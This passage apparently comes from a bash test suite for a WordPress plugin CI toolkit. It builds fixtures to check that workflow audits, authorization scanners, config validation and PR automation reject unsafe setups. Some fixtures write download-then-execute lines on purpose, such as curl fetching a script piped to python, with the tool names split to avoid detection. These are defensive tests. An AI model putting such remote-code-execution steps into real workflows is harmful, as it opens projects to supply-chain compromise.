cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: node20
  main: index.js
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a non-composite local action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: node index.js
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action that dispatches to a local helper script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: source ./helper.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action that sources a local helper script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if ! bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed for a valid custom workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: |
          curl -fsSL https://github.com/example/install.sh -o /tmp/install.sh
          bash /tmp/install.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a multiline download-then-execute payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows" "$audit_fixture/scripts"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: bash scripts/test.sh
EOF

script_download_scheme='https'
script_download_separator='://'
script_download_target='github.com/example/install.sh'
cat > "$audit_fixture/scripts/test.sh" <<EOF
cur''l -fsSL ${script_download_scheme}${script_download_separator}${script_download_target} -o /tmp/install.sh
bash /tmp/install.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a multiline download-then-execute shell script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

dynamic_scheme='https'
dynamic_separator='://'
dynamic_host='example.com'
dynamic_path='payload.py'
dynamic_interpreter='py''thon'
printf '      - run: |\n' >> "$audit_fixture/.github/workflows/ci.yml"
printf '          scheme=%s\n' "$dynamic_scheme" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          host=%s\n' "$dynamic_host" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          path_part=%s\n' "$dynamic_path" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          url="${scheme}%s${host}/${path_part}"\n' "$dynamic_separator" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          cur''l -fsSL "$url" | %s\n' "$dynamic_interpreter" >> "$audit_fixture/.github/workflows/ci.yml"

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a dynamic remote script payload piped to python." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yaml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a .yaml workflow file." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
extra_url_scheme='https'
extra_url_separator='://'
extra_url_host='raw.githubusercontent.com'
extra_url_path='example/repo/main/file.txt'
extra_url="${extra_url_scheme}${extra_url_separator}${extra_url_host}/${extra_url_path}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: echo "$extra_url"
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a non-allowlisted host." >&2
  exit 1
fi

if ! EXTRA_ALLOWED_HOSTS='raw.githubusercontent.com' bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed when EXTRA_ALLOWED_HOSTS included the host." >&2
  exit 1
fi

authorization_fixture="$(mktemp -d)"
mkdir -p "$authorization_fixture/includes"
cat > "$authorization_fixture/.wp-plugin-base.env" <<'EOF'
WORDPRESS_SECURITY_PACK_ENABLED=true
EOF

cat > "$authorization_fixture/includes/public-endpoints.php" <<'EOF'
<?php
add_action( 'wp_ajax_nopriv_my_public_action', 'my_public_handler' );
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed without a suppression." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_public",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Intentional public endpoint."
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly accepted an invalid suppression kind." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": ""
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed with an empty suppression justification." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Public endpoint is required for unauthenticated preflight and only returns nonce-gated non-sensitive metadata."
    }
  ]
}
EOF

if ! WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly failed with a justified suppression." >&2
  exit 1
fi

cat > "$authorization_fixture/includes/rest-public.php" <<'EOF'
<?php

function fixture_allow_public_rest() {
  return true;
}

register_rest_route(
  'fixture/v1',
  '/named-public',
  array(
    'methods'             => 'GET',
    'callback'            => '__return_null',
    'permission_callback' => 'fixture_allow_public_rest',
  )
);

\register_rest_route(
  'fixture/v1',
  '/arrow-public',
  array(
    'methods'             => 'GET',
    'callback'            => '__return_null',
    'permission_callback' => fn() => true,
  )
);

register_rest_route(
  'fixture/v1',
  '/static-public',
  array(
    'methods'             => 'GET',
    'callback'            => '__return_null',
    'permission_callback' => static function () {
      return true;
    },
  )
);

register_rest_route(
  'fixture/v1',
  '/missing-permission',
  array(
    'methods'  => 'GET',
    'callback' => '__return_null',
  )
);

register_rest_route(
  'fixture/v1',
  '/multi-endpoint-missing-permission',
  array(
    array(
      'methods'             => 'GET',
      'callback'            => '__return_null',
      'permission_callback' => '__return_false',
    ),
    array(
      'methods'  => 'POST',
      'callback' => '__return_null',
    ),
  )
);
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed for public REST routes without suppressions." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Public endpoint is required for unauthenticated preflight and only returns nonce-gated non-sensitive metadata."
    },
    {
      "kind": "rest_permission_callback_true",
      "identifier": "fixture/v1:/named-public",
      "path": "includes/rest-public.php",
      "justification": "Intentional public REST fixture for named callback scanner coverage."
    },
    {
      "kind": "rest_permission_callback_true",
      "identifier": "fixture/v1:/arrow-public",
      "path": "includes/rest-public.php",
      "justification": "Intentional public REST fixture for arrow callback scanner coverage."
    },
    {
      "kind": "rest_permission_callback_true",
      "identifier": "fixture/v1:/static-public",
      "path": "includes/rest-public.php",
      "justification": "Intentional public REST fixture for static closure scanner coverage."
    },
    {
      "kind": "rest_permission_callback_missing",
      "identifier": "fixture/v1:/missing-permission",
      "path": "includes/rest-public.php",
      "justification": "Intentional missing-permission fixture to prove suppression wiring only."
    },
    {
      "kind": "rest_permission_callback_missing",
      "identifier": "fixture/v1:/multi-endpoint-missing-permission",
      "path": "includes/rest-public.php",
      "justification": "Intentional multi-endpoint missing-permission fixture to prove per-endpoint scanner coverage."
    }
  ]
}
EOF

if ! WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly failed for justified public REST route suppressions." >&2
  exit 1
fi

deploy_protection_fixture="$(mktemp -d)"
cat > "$deploy_protection_fixture/.wp-plugin-base.env" <<'EOF'
PRODUCTION_ENVIRONMENT=production
EOF

if ! WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly failed in non-strict mode." >&2
  exit 1
fi

if WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" --strict >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly passed in strict mode without GitHub environment context." >&2
  exit 1
fi

deploy_local_project_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$deploy_local_project_fixture/"
mkdir -p "$deploy_local_project_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$deploy_local_project_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if ! env -u GITHUB_ACTIONS -u GITHUB_REPOSITORY -u GH_TOKEN -u GITHUB_TOKEN \
  WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" \
  bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "release/1.2.3" >/dev/null 2>&1; then
  echo "Project validation unexpectedly failed locally for a deploy-enabled project." >&2
  exit 1
fi

if GITHUB_ACTIONS=true GITHUB_REPOSITORY=example/repo WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "release/1.2.3" >/dev/null 2>&1; then
  echo "Project validation unexpectedly passed in strict GitHub mode without deploy environment access." >&2
  exit 1
fi

zip_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$zip_fixture/"
mkdir -p "$zip_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$zip_fixture/.wp-plugin-base/"
cat >> "$zip_fixture/.wp-plugin-base.env" <<'EOF'
SVN_USERNAME=fixture-bot
EOF

if WP_PLUGIN_BASE_ROOT="$zip_fixture" bash "$ROOT_DIR/scripts/ci/validate_config.sh" >/dev/null 2>&1; then
  echo "Config validation unexpectedly accepted committed WordPress.org credentials." >&2
  exit 1
fi

perl -0pi -e 's/^SVN_USERNAME=.*\n//m' "$zip_fixture/.wp-plugin-base.env"
perl -0pi -e 's/^ZIP_FILE=.*/ZIP_FILE=..\/outside.zip/m' "$zip_fixture/.wp-plugin-base.env"

if WP_PLUGIN_BASE_ROOT="$zip_fixture" bash "$ROOT_DIR/scripts/ci/validate_config.sh" >/dev/null 2>&1; then
  echo "Config validation unexpectedly accepted an escaping ZIP_FILE." >&2
  exit 1
fi

rm -rf "$zip_fixture"

zip_symlink_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$zip_symlink_fixture/"
ln -s /etc/hosts "$zip_symlink_fixture/external-link"
if WP_PLUGIN_BASE_ROOT="$zip_symlink_fixture" bash "$ROOT_DIR/scripts/ci/build_zip.sh" >/dev/null 2>&1; then
  echo "ZIP build unexpectedly packaged a symlink." >&2
  exit 1
fi
rm -rf "$zip_symlink_fixture"

admin_ui_budget_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$admin_ui_budget_fixture/"
cat >> "$admin_ui_budget_fixture/.wp-plugin-base.env" <<'EOF'
REST_OPERATIONS_PACK_ENABLED=true
ADMIN_UI_PACK_ENABLED=true
BUILD_SCRIPT=.wp-plugin-base-admin-ui/build.sh
EOF
mkdir -p "$admin_ui_budget_fixture/.wp-plugin-base-admin-ui" "$admin_ui_budget_fixture/assets/admin-ui/media" "$admin_ui_budget_fixture/dist/package/standard-plugin/assets/admin-ui/media"
cat > "$admin_ui_budget_fixture/.wp-plugin-base-admin-ui/build.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
EOF
chmod +x "$admin_ui_budget_fixture/.wp-plugin-base-admin-ui/build.sh"
printf 'console.log("fixture");\n' > "$admin_ui_budget_fixture/assets/admin-ui/index.js"
printf '.fixture{display:block;}\n' > "$admin_ui_budget_fixture/assets/admin-ui/style-index.css"
printf 'nested asset fixture\n' > "$admin_ui_budget_fixture/assets/admin-ui/media/large.bin"
cat > "$admin_ui_budget_fixture/assets/admin-ui/index.asset.php" <<'EOF'
<?php
return array(
  'dependencies' => array(),
  'version'      => 'fixture',
);
EOF
cp \
  "$admin_ui_budget_fixture/assets/admin-ui/index.js" \
  "$admin_ui_budget_fixture/assets/admin-ui/index.asset.php" \
  "$admin_ui_budget_fixture/assets/admin-ui/style-index.css" \
  "$admin_ui_budget_fixture/dist/package/standard-plugin/assets/admin-ui/"
cp "$admin_ui_budget_fixture/assets/admin-ui/media/large.bin" "$admin_ui_budget_fixture/dist/package/standard-plugin/assets/admin-ui/media/"
( cd "$admin_ui_budget_fixture/dist/package" && zip -q "../standard-plugin.zip" standard-plugin/assets/admin-ui/index.js standard-plugin/assets/admin-ui/index.asset.php standard-plugin/assets/admin-ui/style-index.css standard-plugin/assets/admin-ui/media/large.bin )
WP_PLUGIN_BASE_ROOT="$admin_ui_budget_fixture" bash "$ROOT_DIR/scripts/ci/check_admin_ui_pack.sh" >/dev/null
if WP_PLUGIN_BASE_ROOT="$admin_ui_budget_fixture" WP_PLUGIN_BASE_ADMIN_UI_MAX_SCRIPT_BYTES=4 bash "$ROOT_DIR/scripts/ci/check_admin_ui_pack.sh" >/dev/null 2>&1; then
  echo "Admin UI pack validation unexpectedly passed with an undersized script budget." >&2
  exit 1
fi
if WP_PLUGIN_BASE_ROOT="$admin_ui_budget_fixture" WP_PLUGIN_BASE_ADMIN_UI_MAX_SCRIPT_GZIP_BYTES=4 bash "$ROOT_DIR/scripts/ci/check_admin_ui_pack.sh" >/dev/null 2>&1; then
  echo "Admin UI pack validation unexpectedly passed with an undersized script gzip budget." >&2
  exit 1
fi
if WP_PLUGIN_BASE_ROOT="$admin_ui_budget_fixture" WP_PLUGIN_BASE_ADMIN_UI_MAX_TOTAL_BYTES=40 bash "$ROOT_DIR/scripts/ci/check_admin_ui_pack.sh" >/dev/null 2>&1; then
  echo "Admin UI pack validation unexpectedly passed with an undersized total budget for nested assets." >&2
  exit 1
fi
if WP_PLUGIN_BASE_ROOT="$admin_ui_budget_fixture" WP_PLUGIN_BASE_ADMIN_UI_MAX_TOTAL_GZIP_BYTES=40 bash "$ROOT_DIR/scripts/ci/check_admin_ui_pack.sh" >/dev/null 2>&1; then
  echo "Admin UI pack validation unexpectedly passed with an undersized total gzip budget for nested assets." >&2
  exit 1
fi

strict_tools_fixture="$(mktemp -d)"
if WP_PLUGIN_BASE_INSTALL_TOOLS_OS=Plan9 WP_PLUGIN_BASE_INSTALL_TOOLS_ARCH=weird bash "$ROOT_DIR/scripts/ci/install_lint_tools.sh" "$strict_tools_fixture" shellcheck >/dev/null 2>&1; then
  echo "Strict-local tool installation unexpectedly passed on an unsupported platform." >&2
  exit 1
fi

release_branch_source_fixture="$(mktemp -d)"
mkdir -p "$release_branch_source_fixture/bin"
cat > "$release_branch_source_fixture/bin/git" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "ls-remote" ] && [ "$2" = "--exit-code" ] && [ "$3" = "--heads" ] && [ "$4" = "origin" ]; then
  if [ "${RELEASE_BRANCH_EXISTS:-false}" = "true" ]; then
    exit 0
  fi
  exit 2
fi
echo "Unexpected git invocation: $*" >&2
exit 1
EOF
cat > "$release_branch_source_fixture/bin/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  printf '%s\n' "${RELEASE_BRANCH_OPEN_PR_COUNT:-0}"
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$release_branch_source_fixture/bin/git" "$release_branch_source_fixture/bin/gh"
release_branch_source_output="$(mktemp)"
PATH="$release_branch_source_fixture/bin:$PATH" \
  GH_TOKEN=fixture-token \
  RELEASE_BRANCH_EXISTS=true \
  RELEASE_BRANCH_OPEN_PR_COUNT=1 \
  bash "$ROOT_DIR/scripts/update/resolve_release_branch_source.sh" \
    "example/repo" \
    "example" \
    "release/1.2.3" \
    "main" \
    "$release_branch_source_output"
grep -Fxq 'branch_exists=true' "$release_branch_source_output"
grep -Fxq 'ref=release/1.2.3' "$release_branch_source_output"
grep -Fxq 'open_pr_exists=true' "$release_branch_source_output"
: > "$release_branch_source_output"
PATH="$release_branch_source_fixture/bin:$PATH" \
  GH_TOKEN=fixture-token \
  RELEASE_BRANCH_EXISTS=false \
  bash "$ROOT_DIR/scripts/update/resolve_release_branch_source.sh" \
    "example/repo" \
    "example" \
    "release/1.2.3" \
    "main" \
    "$release_branch_source_output"
grep -Fxq 'branch_exists=false' "$release_branch_source_output"
grep -Fxq 'ref=main' "$release_branch_source_output"
grep -Fxq 'open_pr_exists=false' "$release_branch_source_output"

pr_stage_fixture="$(mktemp -d)"
pr_stage_origin="$(mktemp -d)"
git init --bare -q "$pr_stage_origin"
git -C "$pr_stage_fixture" init -q
git -C "$pr_stage_fixture" config user.email "fixture@example.com"
git -C "$pr_stage_fixture" config user.name "Fixture"
mkdir -p "$pr_stage_fixture/.security"
mkdir -p "$pr_stage_fixture/.wp-plugin-base-security-pack"
cat > "$pr_stage_fixture/.wp-plugin-base-security-pack/composer.json" <<'EOF'
{"name":"fixture/security-pack"}
EOF
cat > "$pr_stage_fixture/.phpcs-security.xml.dist" <<'EOF'
<ruleset name="fixture-security"/>
EOF
cat > "$pr_stage_fixture/.phpcs.xml.dist" <<'EOF'
<ruleset name="fixture-quality"/>
EOF
cat > "$pr_stage_fixture/.security/custom-security-suppressions.json" <<'EOF'
{"suppressions":[]}
EOF
git -C "$pr_stage_fixture" add \
  .wp-plugin-base-security-pack/composer.json \
  .phpcs-security.xml.dist \
  .phpcs.xml.dist \
  .security/custom-security-suppressions.json
git -C "$pr_stage_fixture" commit -qm "init"
git -C "$pr_stage_fixture" branch -M main
git -C "$pr_stage_fixture" remote add origin "$pr_stage_origin"
git -C "$pr_stage_fixture" push -q -u origin main
rm -rf "$pr_stage_fixture/.wp-plugin-base-security-pack"
rm -f "$pr_stage_fixture/.phpcs-security.xml.dist" "$pr_stage_fixture/.phpcs.xml.dist"
rm -f "$pr_stage_fixture/.security/custom-security-suppressions.json"
pr_stage_helper_dir="$(mktemp -d)"
cat > "$pr_stage_helper_dir/body.md" <<'EOF'
fixture body
EOF
mkdir -p "$pr_stage_helper_dir/bin"
cat > "$pr_stage_helper_dir/bin/gh" <<'EOF'
#!/usr/bin/env bash
log_file="${PR_STAGE_GH_LOG:?}"
printf '%s\n' "$*" >> "$log_file"
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  if [ "${PR_STAGE_EXISTING_PR:-false}" = "true" ]; then
    echo '[{"number":1,"url":"https://github.com/example/repo/pull/1"}]'
    exit 0
  fi
  echo '[]'
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "edit" ]; then
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "create" ]; then
  echo 'https://github.com/example/repo/pull/1'
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$pr_stage_helper_dir/bin/gh"
PR_STAGE_GH_LOG="$pr_stage_helper_dir/gh.log"
export PR_STAGE_GH_LOG
pr_stage_output="$(mktemp)"
(
  cd "$pr_stage_fixture"
  PATH="$pr_stage_helper_dir/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    GIT_ADD_PATHS=".wp-plugin-base-security-pack,.phpcs-security.xml.dist,.phpcs.xml.dist,.security/custom-security-suppressions.json" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/fixture-removal" \
      "main" \
      "fixture removal" \
      "fixture removal" \
      "$pr_stage_helper_dir/body.md"
)
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.wp-plugin-base-security-pack/composer.json'; then
  echo "Explicit path staging unexpectedly failed to commit a managed deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.phpcs-security.xml.dist'; then
  echo "Explicit path staging unexpectedly failed to commit a managed root-file deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.phpcs.xml.dist'; then
  echo "Explicit path staging unexpectedly failed to commit a managed quality-file deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.security/custom-security-suppressions.json'; then
  echo "Explicit path staging unexpectedly failed to commit a configured suppressions-file deletion." >&2
  exit 1
fi
: > "$PR_STAGE_GH_LOG"
clean_head="$(git -C "$pr_stage_fixture" rev-parse HEAD)"
(
  cd "$pr_stage_fixture"
  : > "$pr_stage_output"
  PATH="$pr_stage_helper_dir/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/no-changes" \
      "main" \
      "fixture no changes" \
      "fixture no changes" \
      "$pr_stage_helper_dir/body.md"
)
grep -Fxq 'pull_request_operation=none' "$pr_stage_output"
if grep -Fq 'pr create' "$PR_STAGE_GH_LOG"; then
  echo "PR automation unexpectedly attempted to create a PR when there were no staged changes." >&2
  exit 1
fi
if [ "$(git -C "$pr_stage_fixture" rev-parse HEAD)" != "$clean_head" ]; then
  echo "PR automation unexpectedly created a commit when there were no staged changes." >&2
  exit 1
fi
if (
  cd "$pr_stage_fixture"
  PATH="$pr_stage_helper_dir/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    GIT_ADD_PATHS="missing-path" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/no-matches" \
      "main" \
      "fixture no matches" \
      "fixture no matches" \
      "$pr_stage_helper_dir/body.md"
); then
  echo "PR automation unexpectedly accepted a GIT_ADD_PATHS list with no matching paths." >&2
  exit 1
fi

pr_auth_fixture="$(mktemp -d)"
git -C "$pr_auth_fixture" init -q
git -C "$pr_auth_fixture" config user.email "fixture@example.com"
git -C "$pr_auth_fixture" config user.name "Fixture"
printf '%s\n' 'root' > "$pr_auth_fixture/README.md"
git -C "$pr_auth_fixture" add README.md
git -C "$pr_auth_fixture" commit -qm "init"
git -C "$pr_auth_fixture" branch -M main
git -C "$pr_auth_fixture" remote add origin "https://github.com/example/repo.git"
printf '%s\n' 'auth fixture change' >> "$pr_auth_fixture/README.md"
pr_auth_helper_dir="$(mktemp -d)"
mkdir -p "$pr_auth_helper_dir/bin"
real_git_path="$(command -v git)"
cat > "$pr_auth_helper_dir/bin/git" <<EOF
#!/usr/bin/env bash
log_file="\${PR_AUTH_GIT_LOG:?}"
auth_log="\${PR_AUTH_GIT_AUTH_LOG:?}"
printf '%s\n' "\$*" >> "\$log_file"
for arg in "\$@"; do
  if [ "\$arg" = "fetch" ] || [ "\$arg" = "push" ]; then
    count="\${GIT_CONFIG_COUNT:-0}"
    i=0
    while [ "\$i" -lt "\$count" ]; do
      key_var="GIT_CONFIG_KEY_\$i"
      value_var="GIT_CONFIG_VALUE_\$i"
      printf '%s\t%s\t%s\n' "\$arg" "\${!key_var:-}" "\${!value_var:-}" >> "\$auth_log"
      i=\$((i + 1))
    done
    exit 0
  fi
done
exec "$real_git_path" "\$@"
EOF
chmod +x "$pr_auth_helper_dir/bin/git"
cat > "$pr_auth_helper_dir/bin/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  echo '[]'
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "create" ]; then
  echo 'https://github.com/example/repo/pull/1'
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "edit" ]; then
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$pr_auth_helper_dir/bin/gh"
PR_AUTH_GIT_LOG="$pr_auth_helper_dir/git.log"
PR_AUTH_GIT_AUTH_LOG="$pr_auth_helper_dir/git-auth-env.log"
export PR_AUTH_GIT_LOG
export PR_AUTH_GIT_AUTH_LOG
pr_auth_output="$(mktemp)"
cat > "$pr_auth_helper_dir/body.md" <<'EOF'
fixture body
EOF
(
  cd "$pr_auth_fixture"
  PATH="$pr_auth_helper_dir/bin:$PATH" \
    GH_TOKEN="fixture-pr-token" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_auth_output" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/auth-fixture" \
      "main" \
      "fixture auth" \
      "fixture auth" \
      "$pr_auth_helper_dir/body.md"
)
expected_auth_header="$(printf 'x-access-token:%s' 'fixture-pr-token' | base64 | tr -d '\n')"
if ! grep -Fxq "push	http.https://github.com/.extraheader	" "$PR_AUTH_GIT_AUTH_LOG"; then
  echo "PR automation did not reset inherited GitHub HTTPS authentication headers before push." >&2
  exit 1
fi
if ! grep -Fxq "push	http.https://github.com/.extraheader	AUTHORIZATION: basic $expected_auth_header" "$PR_AUTH_GIT_AUTH_LOG"; then
  echo "PR automation did not pass GitHub HTTPS authentication to git push from the explicit GH_TOKEN." >&2
  exit 1
fi
if grep -Fq 'fixture-pr-token' "$PR_AUTH_GIT_LOG"; then
